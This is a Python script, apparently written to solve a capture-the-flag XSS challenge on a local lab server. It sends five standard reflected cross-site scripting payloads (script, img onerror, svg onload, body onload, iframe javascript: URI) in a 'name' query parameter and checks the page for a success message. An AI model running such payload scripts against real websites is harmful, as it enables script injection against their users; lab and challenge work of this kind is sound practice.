#!/usr/bin/env python3
"""
XSS Payload Tester with retry mechanism
Tests 5 XSS payloads to find working injection
"""
import urllib.request, urllib.parse, time, re, sys, socket

# Configuration
target_host = "127.0.0.1"
target_port = 33081
target_path = "/page"

# Payloads to test (all contain 'XSS' as required)
payloads = [
    ("script", "<script>alert('XSS')</script>"),
    ("img", "<img src=x onerror=alert('XSS')>"),
    ("svg", "<svg onload=alert('XSS')>"),
    ("body", "<body onload=alert('XSS')>"),
    ("iframe", '<iframe src="javascript:alert(\\'XSS\\')"></iframe>')
]

def send_payload_http(encoded_payload, timeout=15):
    """Send payload using raw HTTP"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        
        request_line = f"GET {target_path}?name={encoded_payload} HTTP/1.1\r\n"
        headers = f"Host: {target_host}:{target_port}\r\n"
        headers += "User-Agent: XSS-Test-Agent/1.0\r\n"
        headers += "Accept: text/html\r\n"
        headers += "Connection: close\r\n\r\n"
        
        sock.connect((target_host, target_port))
        sock.sendall(request_line.encode() + headers.encode())
        
        response = b""
        while True:
            try:
                chunk = sock.recv(8192)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break
        
        sock.close()
        return response.decode('utf-8', errors='ignore')
    except Exception as e:
        return f"ERROR: {e}"

def extract_solution(html):
    """Extract solution-text div content"""
    match = re.search(r'<div class="solution-text"[^>]*>(.*?)</div>', html, re.DOTALL)
    if match:
        return re.sub(r'<[^>]+>', '', match.group(1)).strip()
    return None

print("="*70)
print("[*] XSS Payload Testing")
print(f"[*] Target: http://{target_host}:{target_port}{target_path}")
print("="*70)

for idx, (name, payload) in enumerate(payloads, 1):
    print(f"\n{'-'*60}")
    print(f"[TEST {idx}/{len(payloads)}] {name}")
    print(f"{'-'*60}")
    
    # URL encode payload
    encoded = urllib.parse.quote(payload, safe='')
    print(f"[+] Raw payload: {payload}")
    print(f"[+] Encoded: {encoded[:80]}...")
    
    # Try multiple times with delays
    for attempt in range(2):
        print(f"[+] Attempt {attempt+1}/2...")
        html = send_payload_http(encoded)
        
        if html.startswith("ERROR:"):
            print(f"[-] Request failed: {html}")
            time.sleep(2)
            continue
        
        print(f"[+] Response received ({len(html)} bytes)")
        
        # Extract solution text
        solution = extract_solution(html)
        if solution:
            print(f"[+] solution-text: '{solution[:150]}'")
            
            if "Failed! Try again!" in solution:
                print("[-] Result: Still showing failure")
                if attempt == 0:
                    time.sleep(1)
                    continue
            else:
                print(f"[+] SUCCESS! No failure message found!")
                print(f"[+] Working payload: {payload}")
                print(f"[+] Encoded payload: {encoded}")
                print("\n[+] Full response (first 3000 chars):")
                print(html[:3000])
                sys.exit(0)
        else:
            print("[-] solution-text div not found")
            
        time.sleep(1)
        break

print("\n[-] No successful payloads found in all tests")
print("[-] All payloads still showing 'Failed! Try again!'")
